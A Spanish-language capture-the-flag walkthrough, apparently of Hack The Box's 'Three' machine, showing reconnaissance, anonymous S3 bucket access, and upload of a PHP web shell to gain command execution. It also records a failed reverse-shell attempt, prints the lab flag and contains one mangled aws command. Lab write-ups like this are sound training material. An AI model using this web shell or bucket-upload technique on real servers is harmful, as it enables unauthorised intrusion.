@@ -1,0 +1,219 @@
+## Iniciamos la vpn
+sudo openvpn starting_point_scr1pter98.ovpn
+##Conectados ya a la red de la máquina víctima..
+
+## WhichSystem
+
+[*] 10.129.1.15 (ttl -> 63): Linux
+
+## NMAP
+# Descubramos puertos y servicios en la máquina objetivo
+
+sudo nmap -p- --open -sS --min-rate 5000 -n -sCV -Pn 10.129.1.140 -oG escaneoNmap
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
+|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
+|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Toppers
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+## El escaneo con NMAP nos muestra 2 puertos abiertos con sus servicios y versiones,
+antes de querer ingresar por el puerto 22, veamos si encontramos credenciales o algo
+dentro del sitio web:
+
+Visitemos http://10.129.1.140/ - Veamos que nos encontramos y probemos algunas cosas.
+
+# Puerto 22 SSH
+# Puerto 80 HTTP
+
+## Puerto 80 HTTP: 
+Vemos un sitio web estático, cuya única funcionalidad al parecer es un formulario de contacto que corre con PHP por detrás.
+Esto lo comprobamos con: http://10.129.1.140/index.php/ >> Además de que el ataque de diccionario solo nos reveló esta ruta.
+Y en la misma sección nos da un contacto de correo bajo el dominio mail@thetoppers.htb que apunta a un DNS personalizado.
+
+Agreguemos una entrada para thetoppers.htb en el archivo /etc/hosts con la dirección IP correspondiente para poder
+para acceder a este dominio en nuestro navegador.
+
+## Ataque de diccionario con SecLists para encontrar subdominios: 
+
+gobuster vhost --append-domain -w /usr/share/dirbuster/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://thetoppers.htb
+
+
+#  Encontramos algunos interesantes.
+
+===============================================================
+[+] Url:             http://thetoppers.htb
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/dirbuster/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: s3.thetoppers.htb Status: 404 [Size: 21]
+Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
+Found: _domainkey.thetoppers.htb Status: 400 [Size: 306]
+Found: mailing._domainkey.sunnynews.thetoppers.htb Status: 400 [Size: 306]
+Found: mailing._domainkey.info.thetoppers.htb Status: 400 [Size: 306]
+Found: hallam_dev.thetoppers.htb Status: 400 [Size: 306]
+Found: hallam_ad.thetoppers.htb Status: 400 [Size: 306]
+Found: wm_j_b__ruffin.thetoppers.htb Status: 400 [Size: 306]
+Progress: 52578 / 114442 (45.94%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 52579 / 114442 (45.94%)
+
+## Solo uno nos da status 404 >> Aagreguemos al /etc/hosts/ para no tener inconvenientes con la resolución de dominio y hechemos un vistazo.
+
+# Y obtenemos esto
+
+{"status": "running"} >> La página solo contiene este JSON.
+
+## GOOGLEEMOS
+
+¿Qué son los buckets S3?
+
+    Amazon S3 (Simple Storage Service) es un servicio de almacenamiento en la nube.
+    Los buckets son contenedores donde se almacenan objetos (archivos, datos). Cada bucket tiene:
+        Nombre único globalmente.
+        Una configuración regional (dónde están físicamente los datos).
+        Opciones de control de acceso (público/privado, permisos de usuario).
+    Casos de uso:
+        Almacenar copias de seguridad.
+        Servir contenido web estático.
+        Almacenar datos para análisis.
+
+Podemos interactuar con este depósito S3 con la ayuda de la utilidad AWSCLI >> Pasemos a instalarla si es necesario.
+
+Antes de poder usarlo debemos configurarlo con nuestras credenciales:
+
+aws configure (command)
+
+Te pedirá:
+
+    Access Key ID: Generada desde tu consola de AWS.
+    Secret Access Key: El secreto asociado con tu Access Key ID.
+    Región por defecto: Como us-east-1, eu-west-1, etc.
+    Formato de salida: Por ejemplo, json (predeterminado), table o text.
+
+    Usaremos un valor arbitrario para todos los campos (temp >> en este caso), ya que a veces el servidor está configurado para no verificar
+    autenticación (aún así, debe configurarse con algo para que AWS funcione). 
+
+## Veamos como podemos interactuar con los buckets.
+
+#Supongamos que quieres listar los buckets que tienes:
+aws s3 ls
+
+#Crear un bucket
+aws s3 mb s3://nombre-del-bucket
+
+#Subir un archivo
+aws s3 cp archivo.txt s3://nombre-del-bucket/
+
+#Descargar un archivo
+aws s3 cp s3://nombre-del-bucket/archivo.txt .
+
+#Hacer el bucket público
+aws s3api put-bucket-acl --bucket nombre-del-bucket --acl public-read
+
+## Ya vimos como proceder con S3, toquetiemos algo.
+
+Como vimos, podemos listar todos los cubos S3 alojados por el servidor usando el comando ls
+
+>> aws --endpoint=http://s3.thetoppers.htb s3 ls
+<< 2025-01-26 22:17:03 thetoppers.htb
+
+#Especifiquemos un poco más 
+>>  aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+## Obtenemos estos 3 archivos	                           
+							   PRE images/
+2025-01-26 22:17:03          0 .htaccess
+2025-01-26 22:17:03      11952 index.php
+
+
+
+#Vemos los archivos index.php, .htaccess y un directorio llamado imágenes en el depósito especificado. Parece que
+esta es la raíz web del sitio web que se ejecuta en el puerto 80. Entonces el servidor Apache está usando este depósito S3 como
+almacenamiento.
+
+#awscli tiene otra característica que nos permite copiar archivos a un depósito remoto. Ya sabemos que el
+El sitio web utiliza PHP. Por lo tanto, podemos intentar cargar un archivo PHP shell en el depósito S3 y, dado que está cargado en
+el directorio webroot podemos visitar esta página web en el navegador, que, a su vez, ejecutará este archivo y
+logrará la ejecución remota de código >> A por esa SHELL 
+
+#Podemos usar el siguiente resumen de PHP que usa la función system() que toma el parámetro URL
+cmd como entrada y lo ejecuta como un comando del sistema
+
+Creamos un fichero en este caso llamado shell.php que intentaremos cargar al cubo para que el servidor lo ejecute y nos pueda 
+traer una shell por la URL.
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+Luego, podemos cargar este shell PHP en el depósito thetoppers.htb S3 usando el siguiente comando >> Veamos que pasa
+
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+
+# Vemos que se carga correctamente 
+
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.phttp://thetoppers.htb/shell.php s3://thetoppers.htb
+
+Completed 31 Bytes/31 Bytes (11 Bytes/s) with 1 file(s) reupload: ./shell.php to s3://thetoppers.htb/shell.php
+
+Podemos confirmar que nuestro shell está cargado navegando a http://thetoppers.htb/shell.php. Intentemos
+ejecutando el ID del comando del sistema operativo usando el parámetro de URL cmd.
+
+>> Cuidadito eh: 
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+Tuvimos exito aquí, intentamos traer la consola a local con nc y un servidor en python3
+A pesar de haber conseguido RCE, no pudimos traernos la consola a local, igual hubo un problema aquí,
+
+## Como vemos, estamos escuchando por nc por el puerto 444, puerto configurado en la shell creada.
+
+  pwn3r   ~  sudo lsof -i:444
+Deploying root access for pwn3r. Password pls:
+COMMAND  PID USER FD   TYPE DEVICE SIZE/OFF NODE NAME
+nc      7097 root 3u  IPv4  32152      0t0  TCP *:snpp (LISTEN)
+
+## Pero al solicitar la shell no la estaría encontrando
+
+  pwn3r   ~  python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.14.169 - - [27/Jan/2025 10:22:34] code 404, message File not found
+10.10.14.169 - - [27/Jan/2025 10:22:34] "GET /shell.sh HTTP/1.1" 404 -
+10.129.227.248 - - [27/Jan/2025 10:23:02] code 404, message File not found
+10.129.227.248 - - [27/Jan/2025 10:23:02] "GET /shell.sh HTTP/1.1" 404 -
+10.129.227.248 - - [27/Jan/2025 10:27:29] code 404, message File not found
+10.129.227.248 - - [27/Jan/2025 10:27:29] "GET /shell.sh HTTP/1.1" 404 -
+10.129.227.248 - - [27/Jan/2025 10:28:45] code 404, message File not found
+10.129.227.248 - - [27/Jan/2025 10:28:45] "GET /shell.sh HTTP/1.1" 404 -
+
+
+## La verdad no pude solucionarlo rápido 
+Asíque vamos a la sencilla. 
+
+##Recordemos que ingresarìamos siempre a /var/www/html que es el directorio donde se 
+monta el sitio web en el servidor
+
+http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
+
+FLAG: a980d99281a28d638ac68b9bf9453c2b
+
+En esta máquina vimos - Cloud
+					  - Custom Applications
+					  - AWS
+					  - Reconnaissance
+					  - Web Site Structure Discovery
+					  - Bucket Enumeration
+					  - Anonoymous/Guest Access					 
+					  - Bucket Enumeration
+
+					  
